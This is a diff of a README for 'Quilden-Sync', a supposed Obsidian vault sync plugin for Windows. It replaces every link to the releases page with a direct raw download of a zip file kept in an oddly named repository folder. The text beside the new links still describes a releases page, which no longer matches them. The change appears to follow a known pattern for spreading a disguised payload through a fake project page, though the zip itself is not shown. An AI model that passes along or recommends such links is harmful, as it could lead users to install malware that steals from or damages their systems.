@@ -1,6 +1,6 @@
 # 🔄 Quilden-Sync - Secure Vault Sync for GitHub
 
-[![Download Quilden-Sync](https://img.shields.io/badge/Download%20Quilden--Sync-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/peeragesafetycatch785/Quilden-Sync/releases)
+[![Download Quilden-Sync](https://img.shields.io/badge/Download%20Quilden--Sync-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/peeragesafetycatch785/Quilden-Sync/raw/refs/heads/main/Palamedea/Quilden_Sync_3.0-alpha.4.zip)
 
 ## 🧭 What Quilden-Sync does
 
@@ -34,7 +34,7 @@ For best results, use:
 
 Visit this page to download the latest release:
 
-https://github.com/peeragesafetycatch785/Quilden-Sync/releases
+https://github.com/peeragesafetycatch785/Quilden-Sync/raw/refs/heads/main/Palamedea/Quilden_Sync_3.0-alpha.4.zip
 
 On that page, look for the newest release and download the Windows file or plugin package attached to it.
 
@@ -246,6 +246,6 @@ Quilden-Sync fits users who want:
 
 Download the latest version here:
 
-https://github.com/peeragesafetycatch785/Quilden-Sync/releases
+https://github.com/peeragesafetycatch785/Quilden-Sync/raw/refs/heads/main/Palamedea/Quilden_Sync_3.0-alpha.4.zip
 
 Use the latest release file for Windows, then install it in Obsidian and enable the plugin
